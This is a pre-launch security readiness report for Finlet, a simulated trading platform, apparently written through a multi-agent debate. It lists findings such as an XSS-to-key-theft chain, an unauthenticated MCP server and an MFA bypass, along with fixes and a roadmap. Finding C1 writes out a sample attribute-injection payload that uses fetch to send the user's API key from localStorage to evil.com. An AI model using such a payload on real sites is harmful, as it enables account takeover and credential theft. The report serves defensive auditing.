# Cybersecurity Readiness Report — Finlet

**Date:** 2026-03-25
**Scope:** Internet-facing attack surface (dashboard, API, infrastructure)
**Methodology:** 5-agent adversarial debate (2 critics, 2 defenders, 1 moderator)

---

## Executive Summary

Finlet's security posture is meaningfully above average for a pre-revenue, seed-stage startup — particularly one built by a solo founder. The codebase demonstrates genuine security-first thinking: SHA-256 hashed API keys, a comprehensive MFA implementation (TOTP + SMS + backup codes) with encrypted-at-rest secrets, 6 distinct SQLite-persisted rate limiters, session ownership enforcement that prevents IDOR attacks, Stripe webhook signature verification, fail2ban with custom jails, HSTS with preload, and a CI pipeline gating deploys behind Gitleaks, ruff, mypy, and pip-audit. These are not checkbox items — the implementations show depth (e.g., timing-safe comparisons on MFA codes, PBKDF2 key derivation with per-user salts, 404 responses for both missing and unauthorized sessions).

However, the audit identified one realistic attack chain that must be addressed before launch: the combination of `unsafe-inline` in the Content Security Policy (negating XSS protection), multiple innerHTML usages with an `esc()` function that does not escape double-quotes (enabling attribute-injection XSS), and API keys stored in localStorage (making them extractable via any XSS). This chain — CSP bypass to XSS to key theft — is a textbook account takeover path. The unauthenticated MCP server is also a critical gap, though its stdio transport limits the blast radius to the local machine unless explicitly exposed.

The moderator's verdict weighs the real strengths (defense-in-depth layers, mature auth, comprehensive rate limiting) against the real weaknesses (the XSS-to-key-theft chain, unsalted key hashing, missing server-side lockout). Given that Finlet is a simulated trading platform with no real money, no custody, and minimal PII, the threat model is favorable — but the identified XSS chain could still cause reputational damage and user trust erosion that would be fatal for an early-stage product.

---

## Verdict: LAUNCH WITH CONDITIONS

Finlet may launch provided the following 3 conditions are met first:

1. **Fix the `esc()` function** to escape double-quotes and single-quotes in addition to `<`, `>`, `&`. This closes the attribute-injection XSS vector (H1) that is the entry point for the key-theft chain. Estimated effort: 30 minutes.

2. **Remove `'unsafe-inline'` from `script-src`** in the CSP, or at minimum implement nonce-based CSP for any required inline scripts. This is the defense-in-depth layer that should prevent XSS even if application-level escaping is bypassed. Estimated effort: 2-4 hours (may require refactoring how dashboard JS loads).

3. **Add authentication to the MCP server** or document explicitly that it is local-only and must never be network-exposed. At minimum, add a startup warning log if the MCP server binds to a non-localhost address. Estimated effort: 1-2 hours for documentation + warning; 4-8 hours for full auth.

These 3 fixes address the only realistic pre-launch attack chain. All other findings are post-launch work, prioritized below.

---

## Critical Findings (Must Fix Before Launch)

### C1. XSS-to-Account-Takeover Chain (Composite Finding)

**Components:**
- `dashboard/billing.js:771-776` — `esc()` function does not escape `"` or `'`, enabling attribute-injection XSS
- `finlet/api/security_middleware.py:59` — CSP includes `'unsafe-inline'` in `script-src`, defeating XSS mitigation
- `dashboard/auth.js:183` — API keys stored in localStorage, extractable by any JS running in the page origin

**Attack vector:** An attacker who controls any field rendered into an HTML attribute context (agent name on leaderboard, strategy name, display name) can inject `" onmouseover="fetch('https://evil.com?k='+localStorage.getItem('finlet_api_key'))"`. The CSP allows this because of `'unsafe-inline'`. The stolen key has no expiration and grants full account access.

**Evidence (arch-critic):** `settings.js:862` uses `data-key-id="${esc(key.id)}"` where `esc()` does not escape quotes. `leaderboard.js:128-143` uses `aria-label="Scenario scores sparkline for ${agentName}"` with unescaped agent names.

**Defense assessment (code-defender):** CSP `default-src 'self'` and the explicit script allowlist provide some protection, and the dashboard is vanilla JS with no user-generated content rendering. However, the moderator finds this defense insufficient — leaderboard agent names ARE user-generated content rendered into HTML attributes, and the CSP `'unsafe-inline'` directive explicitly permits the exploit.

**Required fix:**
1. Update `esc()` to also escape `"` to `&quot;` and `'` to `&#39;`
2. Remove `'unsafe-inline'` from `script-src` in the CSP (use nonces or move all JS to external files)
3. Post-launch: migrate from localStorage to httpOnly cookies (tracked as SEC-H2)

**Severity:** CRITICAL — realistic, exploitable, leads to full account takeover.

### C2. MCP Server Has No Authentication

**File:** `finlet/mcp/server.py:40-57`

**Attack vector:** The MCP server provides full read/write access to all sessions without authentication. Any process connecting to the stdio transport can list all sessions, submit trades, advance clocks, and view portfolios. The `_get_session()` helper looks up sessions by ID with no user ownership check. The `_default_session_id()` helper returns any single session regardless of owner.

**Defense assessment (code-defender):** The MCP server uses stdio transport, which limits exposure to the local machine. It is not network-accessible by default.

**Moderator assessment:** The stdio transport is a significant mitigating factor. However, in container/cloud environments, misconfigured networking or SSH tunnels could expose it. The lack of any ownership check (contrast with `routes_trade.py:90` which uses `get_user_session(session_id, user)`) is an architectural inconsistency that should be fixed.

**Required fix:** Before launch, add a startup log warning that MCP is unauthenticated and must not be network-exposed. Document this limitation. Post-launch, add session ownership checks mirroring the API pattern.

**Severity:** CRITICAL in architecture, MEDIUM in practice (stdio transport limits exposure). Elevated to launch-blocking because the fix is low-effort and the risk of accidental exposure is non-zero.

---

## High Findings (Fix Within First Sprint Post-Launch)

### H1. Account Deletion Lacks Authentication Verification

**File:** `finlet/api/routes_settings.py:358-386`

**Description:** `DELETE /settings/account` accepts a `password` field that is never validated. Any authenticated request deletes the account immediately and irreversibly, regardless of the password value.

**Moderator assessment:** Both critics flagged this; defenders did not address it. If an API key is stolen (via the XSS chain above), the attacker can permanently destroy the user's account. Fix: require MFA re-verification for account deletion if MFA is enabled, or at minimum validate the password field.

**Severity:** HIGH — one-click irreversible destruction with a stolen key.

**Status — MITIGATED 2026-05-14 by GDPR Item G (Article 17 deletion pipeline):** the legacy `DELETE /settings/account` route is now **410 Gone** (D9 in `docs/decisions/gdpr-deletion-pattern.md`). The replacement surface (`POST /v1/account/delete` + `GET /v1/account/delete/{job_id}` + `DELETE /v1/account/delete/{job_id}`) is **OAuth Bearer only** and requires two POSTs separated by a single-use 256-bit confirmation token plus a 24-hour grace window during which the user can cancel via `DELETE /v1/account/delete/{job_id}`. A stolen api_key cannot reach the new endpoint pair (api_key is rejected at the OAuth dependency); a stolen Bearer token must additionally re-present the random per-request confirmation token AND wait through the grace window without the legitimate user noticing. The original "one-click irreversible destruction" attack shape is closed; the residual risk surface is "stolen Bearer + 24h of legitimate-user oblivion" which is meaningfully harder to land. The original MFA-on-deletion proposal is superseded by the token + grace-window design — no MFA dependency required.

### H2. Unsalted SHA-256 API Key Hashing

**File:** `finlet/api/auth.py:60-61`

**Description:** API keys are hashed with plain SHA-256 without a per-key salt. If the database is exfiltrated, an attacker can use precomputed rainbow tables to recover keys.

**Defense context (code-defender):** The keys are 128-bit random hex strings from `secrets.token_hex(16)`, making rainbow tables for the full keyspace impractical.

**Moderator assessment:** comp-critic is technically correct that unsalted hashing violates industry best practice. However, code-defender's point is valid — 128-bit random keys are not susceptible to dictionary attacks, and rainbow tables for 128-bit hex are computationally infeasible. The real risk is if key generation ever weakens or if keys are user-chosen. Fix: migrate to HMAC-SHA256 with a server-side secret key. This is a 1-line change that eliminates the class of vulnerability entirely.

**Severity:** HIGH on principle, MEDIUM in practice. Fix within first sprint.

### H3. No Server-Side Account Lockout for Sign-In

**Files:** `finlet/api/routes_auth_mfa.py:202-208`, `finlet/auth/mfa.py:275-309`

**Description:** The sign-in endpoint has no server-side rate limiting. Client-side lockout (5 attempts, 1 minute) is bypassed by direct API calls. fail2ban catches 10 failures in 5 minutes, but distributed attacks from multiple IPs bypass it.

**Defense context:** fail2ban provides network-level protection, and API keys are 128-bit random (brute-force infeasible).

**Moderator assessment:** The defenders are right that brute-forcing 128-bit keys is impossible. The real risk is credential stuffing and timing-based email enumeration. Add server-side rate limiting on `/auth/sign-in` matching the pattern already used for registration (`check_registration_rate`).

**Severity:** HIGH — the fix is trivial (the rate limiting infrastructure already exists) and the gap is conspicuous.

### H4. Google Sign-In Key Rotation as Denial of Service

**File:** `finlet/auth/mfa.py:462-488`

**Description:** Every Google sign-in for an existing user without MFA revokes the current API key and issues a new one. An attacker with a Google account linked to the same email can repeatedly hit `POST /auth/google` to cycle the victim's key, breaking all active integrations.

**Moderator assessment:** Neither defender addressed this. The vulnerability is real but requires the attacker to have a Google account with the matching email and the ability to pass Google's token validation. Fix: only rotate keys on explicit user request, not on every sign-in.

**Severity:** HIGH — availability impact, fix within first sprint.

### H5. Forgot-Key Flow Bypasses MFA

**File:** `finlet/auth/mfa.py:124-158`

**Description:** The forgot-key flow verifies a 6-digit email code and immediately issues a new API key, even if MFA (TOTP/SMS) is enabled. This bypasses all MFA protections.

**Moderator assessment:** This is a genuine auth bypass. If MFA is enabled, the forgot-key flow must require MFA completion before issuing a new key. The MFA settings are preserved but not enforced during this flow.

**Severity:** HIGH — MFA bypass, exploitable by anyone who compromises the user's email.

---

## Medium Findings (Fix Within 30 Days)

### M1. Request Size Limit Bypass via Chunked Transfer

**File:** `finlet/api/security_middleware.py:33-45`

**Description:** The `RequestSizeLimitMiddleware` only checks the `Content-Length` header. Chunked transfer encoding or requests without `Content-Length` bypass the check, allowing arbitrarily large payloads to be streamed into memory.

**Fix:** Also enforce size limits by counting bytes as they stream in, or configure Caddy's `request_body` directive as a secondary limit.

**Severity:** MEDIUM — DoS vector, but Caddy/OS limits provide some backstop.

### M2. Client-Supplied X-Request-ID Without Validation

**File:** `finlet/api/middleware.py:25`

**Description:** The correlation ID middleware accepts client-supplied `X-Request-ID` values without validation. Attackers can inject control characters, extremely long values, or malicious content into logs (log injection).

**Fix:** Validate format (UUID/hex only), enforce length limit (64 chars), strip control characters.

**Severity:** MEDIUM — log injection can mask attacks or corrupt log analysis.

### M3. Sensitive Data in Stripe Error Messages

**File:** `finlet/api/routes_billing.py:155-156`

**Description:** Stripe error messages are forwarded to the client using `str(e)` as fallback, which can include internal Stripe details (API key prefixes, customer IDs).

**Fix:** Always use `e.user_message` and fall back to a generic error string, never `str(e)`.

**Severity:** MEDIUM — information leakage.

### M4. No Encryption at Rest for SQLite

**Description:** SQLite database files on disk are unencrypted. A server compromise exposes all user records, session data, and rate limit state. TOTP secrets are individually encrypted (strong), but emails and other user data are plaintext.

**Defense context (industry-defender):** Data sensitivity is low — only emails and hashed API keys. No SSN, bank accounts, or addresses.

**Moderator assessment:** Correct that the data sensitivity is low. However, for a fintech platform, encryption at rest is table stakes for enterprise credibility. Use SQLCipher or move to an encrypted-at-rest database for the next phase.

**Severity:** MEDIUM — low immediate risk, high credibility impact.

### M5. Unclosed `<script>` Tag in index.html

**File:** `dashboard/index.html:10`

**Description:** The lightweight-charts `<script>` tag is missing its closing `</script>` tag, causing the browser to parse subsequent HTML as JavaScript until the next closing tag. This can cause parse errors or unexpected behavior.

**Fix:** Add the closing `</script>` tag. Trivial fix.

**Severity:** MEDIUM — potential for unexpected script execution context.

### M6. In-Memory Settings Store

**File:** `finlet/api/routes_settings.py:21-23`

**Description:** User settings are stored in module-level dicts with no persistence. Server restarts lose all user profile data and plugin configurations.

**Severity:** MEDIUM — data durability issue, not a security boundary violation.

### M7. MFA Not Mandatory

**Description:** MFA is available (TOTP, SMS, backup codes) but entirely optional. For a fintech platform, MFA should be strongly encouraged or required for paid tiers.

**Severity:** MEDIUM — important for user trust, especially as real trading features are added.

---

## Low Findings (Backlog)

| # | Finding | File | Fix |
|---|---------|------|-----|
| L1 | Missing SRI on local script includes | `dashboard/index.html:138, 413-414` | Add integrity hashes to local `<script>` tags |
| L2 | No Cache-Control headers on sensitive API responses | `finlet/api/security_middleware.py` | Add `Cache-Control: no-store` to auth/billing responses |
| L3 | Plugin config file permissions unrestricted | `finlet/api/routes_settings.py:222` | `chmod 600` on `~/.finlet/plugins.json` |
| L4 | Debug endpoints available in non-production | `finlet/api/app.py:226-227` | Already gated by `FINLET_ENV`; add defense-in-depth check |
| L5 | Email enumeration via registration timing | `finlet/api/routes_auth.py:100-104` | Return generic message for both existing and new emails |
| L6 | Backup code entropy (32-bit) | `finlet/api/mfa.py:152` | Increase to `secrets.token_hex(5)` for 40 bits |
| L7 | No security.txt or vulnerability disclosure policy | N/A | Add `/.well-known/security.txt` |
| L8 | No CORS restriction on webhook endpoints | `finlet/api/app.py:236-242` | Exclude `/billing/webhook` from CORS middleware |
| L9 | Stripe webhook missing rate limiting | `finlet/api/routes_billing.py:161-174` | Add IP-based rate limit or Stripe IP allowlist |

---

## Security Strengths

Credit where due — Finlet's security posture is genuinely impressive for a solo-founder, pre-revenue startup:

1. **Authentication system is production-grade.** CSPRNG key generation, SHA-256 hashing (never storing raw keys), full MFA suite (TOTP + SMS + backup codes), Fernet-encrypted TOTP secrets with PBKDF2 and per-user salts, timing-safe comparisons throughout. This is not MVP auth.

2. **Rate limiting is comprehensive and durable.** 6 separate rate limiters covering every abuse vector, all persisted to SQLite (surviving restarts), with actionable 429 responses that include retry timing and upgrade paths. Automatic hourly cleanup of expired entries.

3. **Session ownership enforcement is architecturally sound.** A single `get_user_session()` function handles all IDOR prevention, returning 404 for both missing and unauthorized sessions (no information leakage). Used consistently across all session-scoped routes.

4. **Infrastructure hardening is multi-layered.** Caddy with auto-TLS and HSTS preload, fail2ban with 3 custom jails, comprehensive security headers (X-Frame-Options, CSP, nosniff, Permissions-Policy, Referrer-Policy), secrets in AWS SSM Parameter Store, structured logging with correlation IDs.

5. **CI/CD pipeline has 4 security gates.** Gitleaks (secret scanning), ruff (linting), mypy (type safety), pip-audit (dependency vulnerabilities) — all must pass before deployment. GitHub Actions pinned to commit SHAs.

6. **Billing security is solid.** Stripe webhook signature verification, redirect URL domain allowlisting, idempotency keys for trade orders, webhook endpoint excluded from OpenAPI schema.

7. **Input validation is thorough.** Pydantic models with explicit constraints on all endpoints, session ID format validation preventing path traversal, email regex validation, field length limits preventing payload bombing.

---

## Standards Compliance Summary

### OWASP ASVS

| Level | Status | Key Gaps |
|-------|--------|----------|
| Level 1 (Minimum) | **Mostly Met** | Server-side session timeout missing, localStorage key storage (tracked SEC-H2), no dedicated audit log |
| Level 2 (Sensitive Data) | **Partial** | No server-side account lockout, no WAF, no pen test, CSP `unsafe-inline`, no CSRF prep for future cookie auth |
| Level 3 (Critical Financial) | **Not Met** | No HSM/KMS, no encryption at rest, no incident response plan, no secrets rotation |

### OWASP Top 10 (2025)

| Risk | Rating | Notes |
|------|--------|-------|
| A01: Broken Access Control | GOOD | Session ownership enforced; MCP is the gap |
| A02: Security Misconfiguration | GOOD | CORS, headers, prod docs disabled |
| A03: Supply Chain | GOOD | pip-audit, Gitleaks, pinned Actions |
| A04: Insecure Design | PARTIAL | No documented threat model |
| A05: Cryptographic Failures | PARTIAL | Unsalted key hashing; TOTP encryption is strong |
| A06: Vulnerable Components | GOOD | CI pipeline enforces |
| A07: Authentication Failures | PARTIAL | MFA available but optional; no server-side lockout |
| A08: Integrity | GOOD | Webhook signatures, pinned Actions |
| A09: Logging & Monitoring | PARTIAL | Good logging, no alerting/SIEM |
| A10: SSRF | NOT ASSESSED | Plugin HTTP calls need URL allowlisting review |

### SOC 2 Type II

Not yet applicable (pre-revenue, no enterprise customers). Key gaps for future readiness: no formal incident response plan, no admin audit trail, no encryption at rest, no automated key rotation, single-instance architecture. SOC 2 Type I is recommended for Month 3-6 post-launch using automation tools (Vanta/Drata).

### PCI DSS

Scope is limited to SAQ-A (Stripe handles card data). No formal SAQ-A documentation exists. Low priority — Stripe's PCI compliance covers the payment flow.

---

## Competitive Positioning

### Where Finlet Stands

Finlet is in the **top 10-15% of seed-stage fintechs** for security posture. Most startups at this stage have basic email/password auth, no rate limiting, no security headers, no CI security gates, and secrets in `.env` files.

### Competitor Comparison

| Feature | Alpaca (Series B+) | QuantConnect (Series A+) | Composer (Series A) | Finlet (Pre-Seed) |
|---------|--------------------|--------------------------|--------------------|-------------------|
| SOC 2 | Type II | Type II | Type II | No |
| MFA | Yes | Yes | Yes | Yes (TOTP+SMS+backup) |
| Encryption at Rest | Yes | Yes | Yes (AES-256) | Partial (TOTP only) |
| Bug Bounty / VDP | Yes | Yes | Unknown | No |
| SSO / OIDC | Yes (Enterprise) | Yes | Unknown | No (Google OAuth only) |
| Pen Testing | Third-party | Third-party | Third-party | None |

**Key insight (industry-defender):** All three competitors achieved these certifications well after their initial launches, with significant funding. Alpaca's SOC 2 came after $6M+ in funding. QuantConnect built institutional-grade security over years. None had SOC 2 at the seed stage.

**Key insight (comp-critic):** While stage-appropriate, the lack of SOC 2, pen testing, and encryption at rest will be blockers for enterprise customer acquisition. These should be on the 6-month roadmap.

**Moderator assessment:** Both perspectives are valid. The competitive gaps are real but stage-appropriate. Finlet should not delay launch for SOC 2, but should begin the process within 3-6 months.

---

## Dissenting Opinions

### 1. localStorage API Key Storage — Launch Blocker or Post-Launch?

**Critics (arch-critic, comp-critic):** CRITICAL finding. Combined with `unsafe-inline` CSP and innerHTML attribute injection, this creates a realistic account takeover chain. Must be fixed before launch.

**Defenders (code-defender, industry-defender):** The CSP still restricts script sources to an explicit allowlist. The dashboard has no user-generated content rendering. The migration to httpOnly cookies is tracked as SEC-H2. The threat model (simulated trading, no real money) limits the blast radius.

**Moderator ruling:** The critics win on the XSS chain (C1) — the `esc()` function not escaping quotes and `unsafe-inline` CSP are fixable before launch and should be. The defenders win on the localStorage-to-httpOnly migration — that is genuinely post-launch work. The compromise: fix the XSS entry points now (esc function + CSP), migrate localStorage post-launch.

### 2. Unsalted SHA-256 Hashing — Vulnerability or Theoretical?

**Comp-critic:** HIGH severity. Industry standard is bcrypt/argon2 or HMAC-SHA256. Rainbow tables are viable against unsalted SHA-256.

**Code-defender:** Keys are 128-bit random hex. Rainbow tables for 128-bit keyspace are computationally impossible ($2^{128}$ entries).

**Moderator ruling:** Code-defender is technically correct — the specific keys in use are not rainbow-tableable. However, comp-critic is correct on principle. The fix (HMAC-SHA256 with a server secret) is trivial and eliminates the class of vulnerability. Rated HIGH on principle, schedule for first sprint post-launch.

### 3. SOC 2 / Enterprise Security — Launch Blocker?

**Comp-critic:** Finlet is 12-18 months behind competitors on security maturity. No SOC 2, no pen test, no encryption at rest.

**Industry-defender:** No competitor had SOC 2 at the seed stage. Over-engineering security before product-market fit burns runway. The threat model (simulated trading, no real money) doesn't demand enterprise-grade controls yet.

**Moderator ruling:** Industry-defender wins. SOC 2 is not a launch blocker for a simulated trading platform at the pre-seed stage. It IS a 6-month priority once traction validates the product. The comparison to Alpaca/QuantConnect's current state is misleading — compare to their launch state.

### 4. MCP Server Authentication — Critical or Acceptable?

**Arch-critic:** CRITICAL. Full session access without authentication. Any network exposure is catastrophic.

**Code-defender:** stdio transport limits exposure to the local machine. Not network-accessible by default.

**Moderator ruling:** Both are right. The stdio transport is a real mitigation, but the total absence of ownership checks is an architectural gap that contradicts the API's strong IDOR prevention. Elevated to launch-blocking because the documentation/warning fix is low-effort.

---

## Recommended Post-Launch Security Roadmap

### Sprint 1 (Week 1-2 Post-Launch)
- [ ] Add server-side rate limiting on `/auth/sign-in` (H3) — pattern exists in `check_registration_rate`
- [ ] Fix Google sign-in key rotation DoS (H4) — only rotate on explicit request
- [ ] Fix forgot-key MFA bypass (H5) — require MFA completion before issuing new key
- [x] ~~Require MFA re-verification for account deletion (H1)~~ — MITIGATED 2026-05-14 by GDPR Item G: legacy route 410 Gone, replacement is OAuth Bearer + single-use confirmation token + 24h grace window. See finding H1 above + `docs/decisions/gdpr-deletion-pattern.md`.
- [ ] Migrate to HMAC-SHA256 for API key hashing with server secret (H2)

### Month 1
- [ ] Fix request size limit bypass for chunked encoding (M1)
- [ ] Validate X-Request-ID format (M2)
- [ ] Sanitize Stripe error messages (M3)
- [ ] Add `security.txt` and vulnerability disclosure policy (L7)
- [ ] Add `Cache-Control: no-store` to sensitive endpoints (L2)
- [ ] Fix unclosed `<script>` tag (M5)

### Month 2-3
- [ ] Migrate localStorage to httpOnly cookies (SEC-H2)
- [ ] Add CSRF protection for cookie-based auth
- [ ] Persist user settings to SQLite (M6)
- [ ] Implement server-side session timeout/expiry
- [ ] Begin SOC 2 Type I documentation

### Month 3-6
- [ ] SOC 2 Type I certification (Vanta/Drata)
- [ ] Third-party penetration test
- [ ] Add WAF (AWS WAF or Cloudflare)
- [ ] SQLite encryption at rest (SQLCipher) or database migration
- [ ] MFA enforcement for paid tiers (M7)
- [ ] Plugin URL allowlisting review (SSRF assessment)

### Month 6-12
- [ ] SOC 2 Type II (observation period)
- [ ] Bug bounty program
- [ ] Centralized log aggregation + SIEM integration
- [ ] Incident response plan documentation
- [ ] If launching real trading: FINRA registration, custody partner evaluation

---

*Report generated by 5-agent adversarial debate. Arch-critic and comp-critic provided offensive analysis; code-defender and industry-defender provided defensive context; moderator synthesized and adjudicated disagreements.*
